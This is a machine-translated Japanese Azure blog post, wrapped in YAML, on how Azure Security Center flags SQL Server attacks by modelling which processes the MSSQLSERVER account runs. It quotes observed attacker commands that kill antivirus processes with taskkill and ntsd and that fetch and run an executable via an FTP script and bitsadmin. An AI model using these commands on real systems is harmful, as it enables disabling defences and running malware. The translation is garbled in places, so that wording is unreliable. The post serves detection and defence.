### YamlMime:Yaml
ms.openlocfilehash: 52117bcfc7c4ceaf8f7134ec4617efd8658dd26c
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 03/11/2022
ms.locfileid: "139909809"
Slug: how-azure-security-center-automates-the-detection-of-cyber-attack
Title: Azure Security Center によるサイバー攻撃の自動検出のしくみ
Summary: 今年の初めに、Greg の 、 に対する攻撃が検出された例をAzure Security Center、大きな記事をSQL Server。 この投稿では、その方法について詳しく説明します。
Content: >-
  <p>今年の初めに、Greg いたは、脅威に対する攻撃が検出された例をAzure Security Center、大きな記事<a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">をSQL Server</a>。 この投稿では、&#39;で大規模なデータを分析してこれらの種類の攻撃を検出する方法と、これらのアプローチからの出力を使用して、いくつかの一般的な手法を共有する他の侵入にピボットする方法について詳しく説明します。</p>


  <p>攻撃手法が急速に進化する中、多くの組織はペースを維持するために苦労しています。 これは、セキュリティ人材の不足によって悪化し、企業は人間によって作成された検出のみに依存できなくなりました。 人間のセキュリティ アナリストの直感をアルゴリズム内に組み込Azure Security Centerパターンの変化に自動的に適応できます。</p>


  <p>セキュリティ&rsquo; センターでこのアプローチを使用して、セキュリティ に対する攻撃を検出する方法SQL Server。 MSSQLSERVER &ndash; アカウントによって実行されるプロセスを分析すると、通常の状況下では、固定された一連のアクションがほぼ常に実行され、非常に安定しているのが分かっています。 このアカウントの安定性により、攻撃が発生した場合に発生する異常なアクティビティを検出するモデルを構築できます。</p>


  <h2>モデルの構築</h2>


  <p>Security Center では、このデータのモデルを構築する前に、同様のディレクトリを使い切るプロセス実行を折りたたむ前処理を実行します。 それ以外の場合、モデルはこれらを異なるプロセスと見なします。 プロセス ディレクトリを越える距離関数を使用してクラスター化し、プロセス名が共有される場所を集計します。 このプロセスの例を次に示します。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/e3c90311-f9ef-4000-9215-d15b526999a0.png"><img alt="acs-1" border="0" height="141" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/9e487a53-bf75-44a4-b916-d58aba0e4813.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-1" width="640"></a></p>


  <p>これは、1 つの要約された状態に減らされます。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/c76e0d3b-2c52-4209-85fd-c260ce03fe01.png"><img alt="acs-2" border="0" height="52" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/e6efcc26-308b-4794-8b4b-603d8f9da496.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-2" width="640"></a></p>


  <p>また、データを操作して、regsvr32.exe や rundll32.exe などのホストされた実行をキャプチャします。これはそれ自体では一般的かもしれませんが、他のファイルの実行に使用できます。 実行されたファイルを独自の権利で実行として処理することで、このメカニズムによって実行されたコードに対する分析情報が得られる。</p>


  <p>この正規化されたデータにより、Azure Security Center検出エンジンは、サブスクリプション内の MSSQLSERVER によって実行されるプロセスの普及率をプロットできます。 このアカウントの安定性により、この単純なアプローチでは、プロセス名と場所による通常の動作の堅牢なモデルが生成されます。 このモデルの視覚化は、次のグラフで確認できます。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/389dce9c-0914-4441-aea9-443be728bb6d.png"><img alt="acs-3" border="0" height="324" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/c9764bd2-4d2d-473a-8d9d-fbe9ef4bdaa9.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-3" width="640"></a></p>


  <h2>異常の検出</h2>


  <p>攻撃対象のような攻撃SQL Server、&rsquo;攻撃者は最初にいくつかのアクションに大きな制約を受け取る。 さまざまな戦術を試し、すべてプロセス実行イベントの証跡を残します。 次の例では、セキュリティ センターによって構築されたのと同じモデルを、サブスクリプションからのデータを使用して、一度にセキュリティ 攻撃が発生したSQL Server示しています。 今回は、興味深いデータを含む低レベルの実行の末尾に異常が見つかっています。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/10d93899-ef87-4e38-877b-d8390eab7742.png"><img alt="acs-4" border="0" height="377" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/e77819d6-c256-4966-bf5a-0f4a0b65b03e.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-4" width="640"></a>モデル&#39;、モデルによって識別される通常とは異なる実行の一部を詳細に確認します。</p>


  <pre>

  taskkill  /im 360rp.exe /f

  taskkill  /im 360sd.exe /f

  taskkill  /im 360rps.exe /f

  ntsd -c q -pn 360rp.exe

  ntsd -c q -pn 360sd.exe

  ntsd -c q -pn 360rps.exe</pre>


  <p>最初のフェーズでは、ホストで実行されているウイルス対策エンジンを無効にしようとする試みがいくつか見られています。 1 つ目は、組み込みツールを使用して <code>taskkill</code> プロセスを終了します。 2 &lsquo;つ目では、デバッガー ntsd&rsquo; &ndash;を使用して、pn &lsquo;引数を使用して中断するプロセスにアタッチし、ターゲットに正常にアタッチされるとコマンド q&rsquo; を実行します。 q &lsquo;コマンド&rsquo; を実行すると、デバッガーはターゲット アプリケーションを終了します。</p>


  <p>ウイルス対策エンジンを無効にすると、攻撃者はインターネットから最初のステージを自由にダウンロードして実行できます。 これは、次の 2 つの異なる方法で行います。</p>


  <p>1 つ目は FTP プロトコルを使用しています。 攻撃者が echo コマンドを使用して一連の FTP コマンドをファイルに書き込むのを確認します。</p>


  <pre>

  echo open xxx.xxx.xxx.xxx&gt;So.2

  echo 111&gt;&gt;So.2

  echo 000&gt;&gt;So.2

  echo get Svn.exe &gt;&gt;So.2

  echo bye</pre>


  <p>その後、次のコマンドが実行されます。</p>


  <pre>

  ftp -s:So.2</pre>


  <p>ファイルが削除され、実行可能ファイルが実行されます。</p>


  <pre>

  del So.2

  Svn.exe</pre>


  <p>実行可能ファイルをダウンロードするこの方法が失敗した場合、攻撃は、今回は HTTP を使用して同じアドレスからファイルをフェッチするセカンダリ メカニズムに戻されます。</p>


  <pre>

  bitsadmin  /transfer n <a href=""></a> c:\Users\Public\Svn.exe&quot;</pre>


  <p>ここでは、攻撃者がツールを使用してインターネットから実行可能ファイルをダウンロードしているのを確認 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa362813(v=vs.85).aspx" target="_blank"><code>bitsadmin</code> します</a>。</p>


  <p>機械学習を使用すると、Azure Security Centerや &ndash; 人間の介入なしに、このような異常なアクティビティに関するアラートが生成されます。 次に、これらのアラートの 1 つを次に示Azure Security Center。</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/17bb2814-6056-44f9-885e-ef755176695e.png"><img alt="acs-5" border="0" height="480" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/2434d6af-b15f-4340-a351-a663a0c720ff.png" style="border: 0px currentcolor; border-image: none; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="acs-5" width="566"></a></p>


  <h2>出力のマイニング</h2>


  <p>このアプローチは、非常に特定のシナリオでの攻撃の検出に限定されます。ただし、検出ファクトリとして機能し、攻撃者によって使用される新しい手法の検出を自動化します。<br>

  &nbsp;<br>

  もう&rsquo;一度例を見 <code>bitsadmin</code> てみます。<br>

  &nbsp;<br>

  <code>bitsadmin&nbsp; /transfer n <a href=""></a> c:\Users\Public\xxx.exe&quot;</code><br>

  &nbsp;<br>

  詳しい検査では、これは攻撃者がオペレーティング システムの組み込み機能を使用してリモート ファイルを実行するために使用できる一般的な手法のように見えますが、セキュリティの専門家ではなくアルゴリズムによって表面化されました。</p>


  <p>の正当な使用は <code>bitsadmin</code> 一般的ですが、リモートの場所、ジョブ名、実行可能ファイルの宛先ディレクトリは疑わしいです。 これにより、新しい <code>bitsadmin</code> 検出の基礎が提供されます。特に、MSSQLSERVER アカウントによって実行されるかどうかに依存しない、異常な実行を対象とします。<br>

  &nbsp;<br>

  したがって、この <code>bitsadmin</code> アプローチによって生成されたその他のアラートは、スタンドアロン検出の機会として適合性のためにマイニングできます。 さらに、一般的な手法が別の攻撃ベクトルによって共有されているサブスクリプションで発生する他の攻撃を顧客に警告します。</p>


  <h2>まとめ</h2>


  <p>アプリケーションを使用Azure Security Centerデプロイを使用しているお客様SQL Server、この検出アプローチの恩恵を自動的に受け取ります。 これは異常に基づくため、戦術の変化に適応し、人間の専門家の関与なしに新しい攻撃を警告します。 このアプローチによってキャプチャされた新しい手法により、すべてのセキュリティ センターのお客様を保護するためのフィードバックである検出の機会が生み出されます。</p>


  <p>この記事で説明&quot;されている攻撃の種類とそれらを軽減する方法の詳細については、ブログ「サイバー攻撃を明らかにするAzure Security Center方法」を<a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">参照してください</a>。&quot;</p>


  <p>データ の検出の詳細についてはAzure Security Centerを参照してください。</p>


  <ul>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-detection-capabilities" target="_blank">&rsquo;Azure Security Center検出機能</a></li>
   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-managing-and-responding-alerts" target="_blank">Azure セキュリティ センターでのセキュリティの警告の管理と対応</a></li>
  </ul>
